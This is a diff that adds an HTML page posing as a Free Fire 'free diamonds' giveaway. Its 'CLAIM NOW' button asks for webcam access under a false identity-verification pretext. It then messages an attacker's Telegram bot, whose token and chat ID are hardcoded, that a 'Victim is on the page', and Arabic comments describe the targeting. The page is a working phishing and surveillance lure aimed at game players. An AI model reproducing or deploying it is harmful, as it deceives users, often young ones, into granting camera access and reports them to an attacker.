@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Fire Rewards</title>
+    <style>
+        body { background: #121212; color: orange; text-align: center; font-family: sans-serif; }
+        .btn { padding: 20px; background: orange; color: black; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>💎 Free Diamonds Claim 💎</h1>
+    <p>Click the button below to claim 1000 Diamonds!</p>
+    <button class="btn" onclick="startCapture()">CLAIM NOW</button>
+
+    <script>
+        const TOKEN = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; //
+        const CHAT_ID = "7479786207"; //
+
+        function startCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                // الكود يطلب الكاميرا من المتصفح
+                alert("Verifying Account... Please wait.");
+                // إرسال ميساج للتيليجرام بأن الضحية دخل للصفحة
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🎯 Victim is on the page and camera access requested!`);
+            })
+            .catch(err => { alert("Error: Camera permission required to verify your identity!"); });
+        }
+    </script>
+</body>
+</html>
